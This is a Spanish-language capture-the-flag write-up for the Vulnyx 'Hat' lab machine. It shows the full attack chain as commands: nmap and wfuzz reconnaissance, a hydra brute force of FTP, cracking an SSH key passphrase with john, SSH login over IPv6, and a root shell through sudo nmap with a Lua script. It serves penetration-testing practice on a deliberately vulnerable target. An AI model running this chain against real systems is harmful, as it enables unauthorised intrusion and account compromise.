# Vulnyx-Hat

## Identificación de la IP en la red
```bash
arp-scan -I eth0 --localnet
# (IP-victima)  08:00:27:fd:2a:fe       PCS Systemtechnik GmbH
```

## Escaneo de Puertos
```bash
nmap -p 22,80,65535 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
# 22/tcp    filtrado    ssh
# 80/tcp    abierto      http    Apache httpd 2.4.38 ((Debian))
# 65535/tcp abierto      ftp     pyftpdlib 1.5.4
```

Puerto 22: filtrado. Puerto 80: servidor Apache. Haremos fuzzing al puerto 80 para encontrar vulnerabilidades.

## Fuzzing al Puerto 80
```bash
dirb http://(IP-victima)
# http://(IP-victima)/logs/
# http://(IP-victima)/php-scripts/

dirb http://(IP-victima)/logs/
# http://(IP-victima)/logs/ 

wfuzz -c --hc=404  -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://(IP-victima)/FUZZ.php
# file

wfuzz -c --hc=404  -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://(IP-victima)/logs/FUZZ.log
# vsftpd
```

Dentro de "/logs/vsftpd.log" encontramos información relevante sobre un usuario "admin_ftp". Intentamos realizar fuerza bruta en el servicio FTP.

## Fuerza Bruta en FTP
```bash
hydra -l admin_ftp -P /usr/share/wordlists/rockyou.txt  ftp://(IP-victima):65535
# host:(IP-victima)   usuario: admin_ftp   contraseña: c****y
```

Dentro del FTP encontramos archivos, incluyendo una nota y un id_rsa. Descargamos los archivos y encontramos un posible usuario "sysadmin" en la nota y un id_rsa en el otro archivo.

## Descifrado del id_rsa
```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Contraseña: i**********f
chmod 600 id_rsa
```

Tenemos el usuario y la contraseña. Intentamos acceder al puerto SSH que previamente estaba filtrado, esta vez usando IPv6.

## Acceso SSH con IPv6
```bash
ping6 -c2 -I eth0 ff02::1
# 64 bytes from fe80::**********************0: icmp_seq=1 ttl=64 time=1.09 ms
nmap -6 -p- -sV  fe80::**********************0:
```

Encontramos el puerto 22 abierto en IPv6. Intentamos acceder con el usuario y la contraseña.

## Acceso SSH con IPv6
```bash
ssh -6 -i id_rsa cromiphi@fe80::***********************0:
# Contraseña: i*********f
```

Estamos dentro con el usuario "cromiphi". Ahora intentaremos escalar privilegios.

## Escalada de Privilegios
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/nmap
```

Podemos ejecutar nmap como root. Consultamos GTFObins para encontrar una forma de obtener una shell como root.

## Obtención de Shell como Root
```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

whoami
# root
```

Ahora somos root (:D)
